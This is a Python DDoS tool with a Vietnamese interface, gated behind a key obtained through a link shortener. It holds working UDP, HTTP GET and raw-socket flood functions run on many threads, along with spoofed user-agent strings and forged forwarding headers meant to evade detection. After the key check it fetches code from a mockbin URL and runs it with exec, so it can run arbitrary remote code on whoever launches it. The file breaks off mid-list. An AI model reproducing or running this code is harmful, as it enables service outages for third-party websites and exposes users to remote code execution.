 "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')"
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')"
 "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')"
 "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')"
 "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')"
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')"
 "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')"
 "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')"
 "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')"
 "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')"
 "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')"
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')"
 "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')"
 "Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')"
 "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')"
 "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')"
 "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')"
 "Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')"
 "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')"
 "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')"
 "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')"
 "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')"
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)')"
 "Opera/9.20 (Windows NT 6.0; U; en)')"
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')"
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')"
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')"
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')"
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')"
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')"
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')"
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')"
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')"
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')"
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')"
 "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')"
 "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')"
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')"
 "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')"
 "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')"
 "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')"
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')"
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')"
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')"
 "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')"
 "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')"
 "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')"
 "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')"
 "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')"
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')"	"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')"
 "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')"
 "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')"
 "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')"
 "Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')"
 "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')"
 "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')"
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')"
 "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')"
 "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')"
 "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')"
 "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')"
 "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')"
 "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')"
 "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')"
 "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')"
 "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')"
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')"	"Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')"
 "Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')"
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')"	"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')"
 " Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')"
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')"
 "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')"
 "Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')"
 "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')"
 "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')"
 "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')"
 "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')"
      "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
      "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
      "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
      "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
      "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
      "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
      "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
      "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
      "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
      "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
      "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')"
]

def TimeStamp():
    now = str(date.today())
    return now
    
def current_time():
    return datetime.now().strftime("%H:%M:%S")

def current_date():
    return datetime.now().strftime("%d/%m/%Y")

def get_time_vietnam():
    return datetime.now().strftime("%Y-%m-%dT%H:%M:%S")

def get_ip():
    return socket.gethostbyname(socket.gethostname())

time_vietnam = get_time_vietnam()
ip_v4 = get_ip()
current_time_now = current_time()
current_date_now = current_date()
delbiet = TimeStamp()
banner = [
            "\033[1;31m┌──────────────────────────────────────────────┐",
            f"\033[1;31m│   \033[1;37mIP:          \033[1;31m[\033[1;37m{ip_v4}\033[1;31m]               \033[1;31m│",
            "\033[1;31m│   \033[1;37mCountry:     \033[1;31m[\033[1;37mUknown\033[1;31m]                      \033[1;31m│",
            f"\033[1;31m│   \033[1;37mTime - Date: \033[1;31m[\033[1;37m{current_time_now} \033[1;31m| \033[1;37m{current_date_now}\033[1;31m]       \033[1;31m│",
            "\033[1;31m└──────────────────────────────────────────────┘"
]
benner = r"""
    HELLO WORLD! WELCOME TO TOOL DDOS
    PRESS ENTER TO CONTINUE
    MADE BY NGUYEN PHU FROM VIETNAM"""
Anime.Fade(Center.Center(benner), Colors.red_to_purple, Colorate.Vertical, interval=0.07, enter=True)
print("\n".join(banner))

menu= """
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = =
\033[1;37m┌─────────────────────┐
\033[1;36m║  \033[1;37m    INPUT KEY      \033[1;36m║
\033[1;37m└─────────────────────┘
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = """
print(menu)
time.sleep(0.0003)
ngay=int(strftime('%d'))
keypremium=str(ngay)
key1=str(ngay*124681818+28881472*191928299+2110836*92929282282929) 
key = 'FREE'+key1
keyv1 = 'VIPLUXURYPREMIUM'+keypremium
url = 'https://keybpmtool.infy.uk?key='+key
token_concac = 'e42efb2a6c68492c04f1545c8fed4d18a8285bab94055a0c96e40d3710c24c84'
yeumoney = requests.get(f'https://yeumoney.com/QL_api.php?token={token_concac}&format=json&url={url}').json()
if yeumoney['status']=="error": 
    print(yeumoney['message'])
    quit()
else:
    link_key=yeumoney['shortenedUrl']
h=open('DDoSOZZY.txt',mode='a+')
h=open('DDoSOZZY.txt',mode='r')
ozzy=h.read()
h.close()
print()
if ozzy== keyv1 or ozzy== key:
    print('\033[1;32mAPI KEY ĐÚNG OPEN TOOL !')
    time.sleep(1)
    exec(requests.get('https://5eb879fd4b4b48809fac650bbb17f29a.api.mockbin.io/').text)
else:
     time.sleep(0.0003)
     print('\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
print('\033[1;33mLINK LẤY API KEY LÀ:\033[1;31m '+link_key)
print('\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
keynhap = input('\033[1;31m[\033[1;37m×.×\033[1;31m] \033[1;37m➩ \033[1;32mINPUT API KEY\033[1;33m ~>\033[1;36m ')
print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
if keynhap == key or keynhap== keyv1:
    print('\033[1;32mAPI KEY ĐÚNG OPEN TOOL !')
    print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
    time.sleep(1)
    h=open('DDoSOZZY.txt',mode='w')
    h.write(keynhap)
    h.close()
    
else:
    print('\033[1;33mAPI KEY SAI ! ')
    print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
    time.sleep(0.5)
    quit()
    
def layer4_attack(ip, port):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'\x00' * 1024,(ip, port))
            logging.info(f"\x1b[1;32mTấn công \033[37m{ip}\x1b[1;32m:\033[37m{port} \x1b[1;32mthành công")
        except socket.error as e:
            logging.error(f"\x1b[1;31mLỗi khi tấn công \033[37m{ip}: {port}: {e}")

def start_layer4_attack(ip, port, number_of_threads):
    stop_flag.clear()
    with ThreadPoolExecutor(max_workers=number_of_threads) as executor:
        futures = [executor.submit(layer4_attack, ip, port) for _ in range(number_of_threads)]
        try:
            while not stop_flag.is_set():
                user_input = input(f"Nhập '{Fore.MAGENTA}q{Style.RESET_ALL}' để dừng tấn công: ")
                if user_input.lower() == 'q':
                    stop_flag.set()
                    break
        except KeyboardInterrupt:
            stop_flag.set()

    for future in futures:
        future.result()

    logging.info("Tấn công Layer 4 đã dừng.")

def layer7_attack(url):
    while not stop_flag.is_set():
        try:
            response = requests.get(url)
            if response.status_code == 200:
                logging.info(f"\x1b[1;32mTấn công \033[37m{url} \x1b[1;32mthành công")
            else:
                global attack_num
                attack_num += 1
                logging.warning(f"\x1b[1;31mTấn công \033[37m{url} \x1b[1;31mthất bại với mã trạng thái: \033[37m{response.status_code} : \033[93m[\033[37m{attack_num}\033[93m] ")
        except requests.RequestException as e:
            logging.error(f"\x1b[1;93mLỗi khi tấn công \033[37m{url}:{e}")

def start_layer7_attack(url, number_of_threads):
    stop_flag.clear()
    with ThreadPoolExecutor(max_workers=number_of_threads) as executor:
        futures = [executor.submit(layer7_attack, url) for _ in range(number_of_threads)]
        try:
            while not stop_flag.is_set():
                user_input = input(f"Nhập '{Fore.MAGENTA}q{Style.RESET_ALL}' để dừng tấn công: ")
                if user_input.lower() == 'q':
                    stop_flag.set()
                    break
        except KeyboardInterrupt:
            stop_flag.set()

    for future in futures:
        future.result()

    logging.info("Tấn công Layer 7 đã dừng.")

def ddos_web_vip(url):
    port = 443
    while not stop_flag.is_set():
        try:
            ip = socket.gethostbyname(url)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(f'GET / HTTP/1.1\r\nHost: {url}\r\n\r\n'.encode('utf-8'))
            response = sock.recv(4096)
            if b'200 OK' in response:
                logging.info(f"\x1b[1;32mTrang web \033[37m{url} \x1b[1;32mvẫn hoạt động")
            else:
                global attack_num
                attack_num += 1
                logging.warning(f"\x1b[1;31mTrang web \033[37m{url} \x1b[1;31mđã die : \033[93m[\033[37m{attack_num}\033[93m]")
            sock.close()
        except socket.error as e:
            logging.error(f"\x1b[1;93mLỗi khi tấn công \033[37m{url}:{port}:{e}")

def start_ddos_web_vip(url, number_of_threads):
    stop_flag.clear()
    with ThreadPoolExecutor(max_workers=number_of_threads) as executor:
        futures = [executor.submit(ddos_web_vip, url) for _ in range(number_of_threads)]
        try:
            while not stop_flag.is_set():
                user_input = input(f"Nhập '{Fore.MAGENTA}q{Style.RESET_ALL}' để dừng tấn công: ")
                if user_input.lower() == 'q':
                    stop_flag.set()
                    break
        except KeyboardInterrupt:
            stop_flag.set()

    for future in futures:
        future.result()

    logging.info("Tấn công DDOS đã dừng.")

#henry
def get_status(url):
    try:
        response = requests.get(url)
        status_code = response.status_code
        pps = random.randint(30, 100)
        print(f"[OZZY | ATTACKING] \nStatus: {status_code} | PPS: {pps} | RQS: {requests_per_second}")
    except requests.RequestException:
        print(f'[OZZY | ATTACKING] \nStatus: 500 | PPS: 0 | RQS: {requests_per_second}')

def send_requests(url, duration, interval):
    start_time = time.time()
    end_time = start_time + duration
    request_count = 0

    while time.time() < end_time:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            requests.get(url, headers=headers)
            request_count += 1
            time.sleep(interval)
        except requests.RequestException:
            print('[OZZY | ATTACKING] \nStatus: 500 | PPS: 0 | RQS: N/A')

    total_time = time.time() - start_time
    if total_time > 0:
        rqs = request_count / total_time
    else:
        rqs = 0
    
    return rqs

def worker(url, duration):
    interval = 1.0 / requests_per_second
    rqs = send_requests(url, duration, interval)
    print(f"[OZZY] Final RQS: {rqs:.2f}")
    
#mulv1
def generate_random_string(min_length, max_length):
    characters = string.ascii_letters + string.digits
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(characters) for i in range(length))

encoding_header = ['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity']
cache_header = ['no-cache', 'max-age=0', 'no-store']
fetch_mode = ['navigate', 'same-origin', 'no-cors']
fetch_site = ['cross-site', 'same-origin']
fetch_dest = ['document', 'iframe', 'empty']
accept_header = ['*/*', 'text/html', 'application/json', 'application/xml']
language_header = ['en-US,en;q=0.9', 'vi-VN,vi;q=0.8']

random_headers = [
    {"accept": random.choice(accept_header)},
    {"accept-language": random.choice(language_header)},
    {"referer": "https://" + generate_random_string(5, 10) + ".com"},
    {"x-forwarded-for": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"},
    {"x-requested-with": "XMLHttpRequest"},
    {"dnt": str(random.randint(0, 1))},  # Do Not Track
    {"sec-fetch-site": random.choice(fetch_site)},
    {"sec-fetch-mode": random.choice(fetch_mode)},
    {"sec-fetch-dest": random.choice(fetch_dest)},
    {"upgrade-insecure-requests": "1"},
    {"cache-control": random.choice(cache_header)},
    {"connection": "keep-alive"},
    {"pragma": "no-cache"},
    {"te": "trailers"},
    {"x-real-ip": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"},
    {"forwarded": f"for={random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"},
    {"via": f"1.1 {generate_random_string(5, 10)}"},
    {"x-csrf-token": generate_random_string(10, 20)},
    {"origin": "https://" + generate_random_string(8, 15) + ".com"},
    {"x-forwarded-proto": "https"},
    {"x-frame-options": "DENY"},
    {"x-xss-protection": "1; mode=block"},
    {"x-content-type-options": "nosniff"},
    {"x-download-options": "noopen"},
    {"x-permitted-cross-domain-policies": "none"},
    {"expect-ct": "max-age=7776000, enforce"},
    {"strict-transport-security": "max-age=31536000; includeSubDomains"},
    {"content-security-policy": "default-src 'self'"},
    {"feature-policy": "geolocation 'self'; microphone 'self'"},
    {"access-control-allow-origin": "*"},
    {"access-control-allow-methods": "GET, POST, OPTIONS"},
    {"access-control-allow-headers": "Content-Type, Authorization"},
    {"timing-allow-origin": "*"},
    {"x-dns-prefetch-control": "on"},
    {"x-download-options": "noopen"},
